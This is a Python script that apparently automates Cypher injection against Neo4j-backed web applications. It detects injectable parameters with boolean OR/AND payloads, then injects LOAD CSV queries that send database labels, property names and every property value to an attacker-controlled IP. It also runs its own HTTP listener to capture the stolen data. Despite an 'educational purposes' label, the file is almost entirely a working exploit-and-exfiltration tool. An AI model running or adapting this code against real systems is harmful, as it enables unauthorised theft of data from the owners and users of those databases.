import argparse
import requests
import urllib.parse
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Log the incoming GET request path (which could contain the data)
        print(f"Received data: {self.path}")
        # Send a basic HTTP response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Received")
    
    # Suppress console logging of the HTTP server
    def log_message(self, format, *args):
        return

class Listener():
    
    def __init__(self, port):
        self.server = HTTPServer(("0.0.0.0", port), RequestHandler)

    def start_listener(self):
        print("starting listener...")
        self.server.serve_forever()

    def stop_listener(self):
        print("stopping listener...")
        self.server.shutdown()


class Neo4jInjector:
    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None):
        self.target = target
        self.exfil_ip = exfil_ip + ":" + str(listen_port)
        self.request_type = request_type
        self.parameters = parameters
        self.cookie = cookie
        # Check if a cookie was provided and split it into a dictionary if so
        self.headers = {
            'User-Agent': 'curl/8.5.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookie
        }
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
        }

    def inject_payload(self, payload):
        injection_characters = ["-1", "'", "\""]
        for injection_character in injection_characters:
            full_payload = injection_character + payload
            encoded_payload = urllib.parse.quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            self.execute_request(url, data)

    def prepare_request_data(self, encoded_payload):
        if self.request_type == "API":
            url = self.target + self.parameters + encoded_payload
            data = None
        elif self.request_type == "GET":
            url = f"{self.target}?{self.parameters}={encoded_payload}"
            data = None
        elif self.request_type == "POST":
            url = self.target
            data = f"{self.parameters}={encoded_payload}"
        else:
            raise ValueError("Invalid request type")
        return url, data

    def execute_request(self, url, data=None):
        try:
            if self.request_type == "POST":
                response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies)
            else:
                response = requests.get(url, headers=self.headers, proxies=self.proxies)

            if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                print(f"Payload Injected")
                return response

        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")

        return None

    def detect_inject(self):
        print("Determining if the target is injectable")
        injection_characters = ["'", "\"", "-1"]
        working_char = ""
        or_case = None
        and_case = None
        for injection_character in injection_characters:
            if (injection_character == "-1"):
                payload = f" OR 1=1"
            else:
                payload = f" OR 1=1 OR 'g' = {injection_character}g"
            full_payload = f"{injection_character}{payload}"
            encoded_payload = urllib.parse.quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            response = self.execute_request(url, data)
            if (response):
                working_char = injection_character
                or_case = response
                break

        if (working_char == "-1"):
            full_payload = f"{working_char} AND 1=1 AND 1=0"
        else:
            full_payload = f"{working_char} AND 1=1 AND 1=0 AND 'g' = {working_char}g"
        encoded_payload = urllib.parse.quote(full_payload, safe='')
        url, data = self.prepare_request_data(encoded_payload)
        and_case = self.execute_request(url, data)
        
        return (and_case and and_case.headers["Content-Length"] != or_case.headers["Content-Length"])

    def exfil_data(self):
        print("Dumping Labels")
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM 'http://{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
        label = input("Enter Label: ")

        print("Dumping Properties")
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")

        print("Dumping Value of Properties")
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT x,p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")

def main():
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-l", "--exfil-ip", required=False, help="Exfiltration IP, ommitting this arg will make the program start its own listener")
    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type: API/GET/POST")
    parser.add_argument("-p", "--parameters", required=False, default="", help="Vulnerable parameters")
    parser.add_argument("-c", "--cookie", required=False, help="Optional cookie in format key=value")
    parser.add_argument("--listen-port", required=False, type=int, default=80, help="Port for the listener to capture incoming data")

    args = parser.parse_args()

    if ((args.type == "GET" or args.type == "POST") and args.parameters == ""):
        print("parameter required for GET and POST methods")
        return
    
    # 
    if (not args.exfil_ip):
        hostname = socket.gethostname()
        args.exfil_ip = socket.gethostbyname(hostname)

        # Start the listener in a separate thread
        listener = Listener(args.listen_port)
        listener_thread = threading.Thread(target=listener.start_listener)
        listener_thread.daemon = True
        listener_thread.start()
    else:
        listener = None

    injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)

    if (args.type == "API"):
        if (injector.detect_inject()):
            print("Target likely injectable, continuing")
        else:
            if (input("Target likely not injectable, continue?").lower() != "y"):
                return
    else:
        print("This version of the program only supports injection detection of API methods")

    # Begin exfiltration process
    injector.exfil_data()

    if (listener):
        # Shutdown the listener and join the thread
        listener.stop_listener()
        listener_thread.join()

if __name__ == "__main__":
    main()